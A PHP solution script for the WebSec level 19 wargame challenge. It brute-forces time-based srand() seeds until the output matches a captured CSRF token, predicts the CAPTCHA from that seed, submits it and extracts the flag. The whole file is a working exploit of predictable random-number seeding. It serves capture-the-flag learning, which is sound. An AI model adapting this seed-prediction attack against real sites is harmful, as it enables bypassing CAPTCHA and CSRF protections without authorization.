<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║       WebSec Level 19 - CAPTCHA Breaker (PRNG Attack)     ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

// Paso 1: Obtener una sesión fresh
echo "[1] Getting fresh session...\n";
$ch = curl_init("https://websec.fr/level19/index.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_NOBODY, false);
$start_time = microtime(true);
$response = curl_exec($ch);
$end_time = microtime(true);
curl_close($ch);

// Calcular latencia
$latency = ($end_time - $start_time) / 2;

// Extraer timestamp del servidor
$server_time = null;
if (preg_match('/date:\s*([^\r\n]+)/i', $response, $matches)) {
    $server_time = strtotime($matches[1]);
} else {
    $server_time = time();
}

// Extraer session ID
if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) {
    die("[-] Could not extract session ID\n");
}
$session_id = $matches[1];

// Extraer body y token
$parts = explode("\r\n\r\n", $response, 2);
$body = isset($parts[1]) ? $parts[1] : $response;

if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) {
    die("[-] Could not extract CSRF token\n");
}
$real_token = $token_match[1];

echo "[+] Session ID: " . $session_id . "\n";
echo "[+] Real CSRF Token: " . $real_token . "\n";
echo "[+] Server time: " . $server_time . " (" . date('Y-m-d H:i:s', $server_time) . ")\n";
echo "[+] Estimated latency: " . sprintf("%.3f", $latency) . " seconds\n\n";

// Paso 2: Buscar la semilla correcta
echo "[2] Bruteforcing seed to match CSRF token...\n";

$found = false;
$attempts = 0;

// Ajustar por latencia
$adjusted_time = $server_time - ceil($latency);

for ($offset = -60; $offset <= 60 && !$found; $offset++) {
    for ($micro = 0; $micro < 1000000 && !$found; $micro += 500) {
        $seed = $adjusted_time + $offset + ($micro / 1000000);
        
        srand($seed);
        $test_token = generate_random_text(32);
        
        $attempts++;
        
        if ($test_token === $real_token) {
            echo "\n[+] ✓ SEED FOUND!\n";
            echo "[+] Seed: " . sprintf("%.6f", $seed) . "\n";
            echo "[+] Offset: $offset seconds, Micro: $micro microseconds\n";
            echo "[+] Attempts: $attempts\n\n";
            
            // Ahora generar el CAPTCHA con la misma semilla
            srand($seed);
            generate_random_text(32); // Skip token
            $captcha = generate_random_text(25);
            
            echo "[3] Predicted CAPTCHA: $captcha\n\n";
            
            // Enviar el CAPTCHA
            echo "[4] Submitting CAPTCHA...\n";
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n╔════════════════════════════════════════════════════════════╗\n";
                echo "║                   🎉 SUCCESS! 🎉                         ║\n";
                echo "╠════════════════════════════════════════════════════════════╣\n";
                echo "║  CAPTCHA was successfully broken!                          ║\n";
                
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "║                                                            ║\n";
                    echo "║  FLAG: " . str_pad($flag_match[0], 49) . "║\n";
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                } else {
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                    echo "\n[*] Flag should have been emailed. Response:\n";
                    echo $result . "\n";
                }
            } else {
                echo "[-] Failed! Response:\n";
                echo $result . "\n";
            }
            
            $found = true;
            exit(0);
        }
        
        if ($attempts % 1000 == 0) {
            echo ".";
        }
    }
}

if (!$found) {
    echo "\n\n[-] Could not find matching seed after $attempts attempts\n";
    echo "[-] Token we're looking for: $real_token\n";
}
?>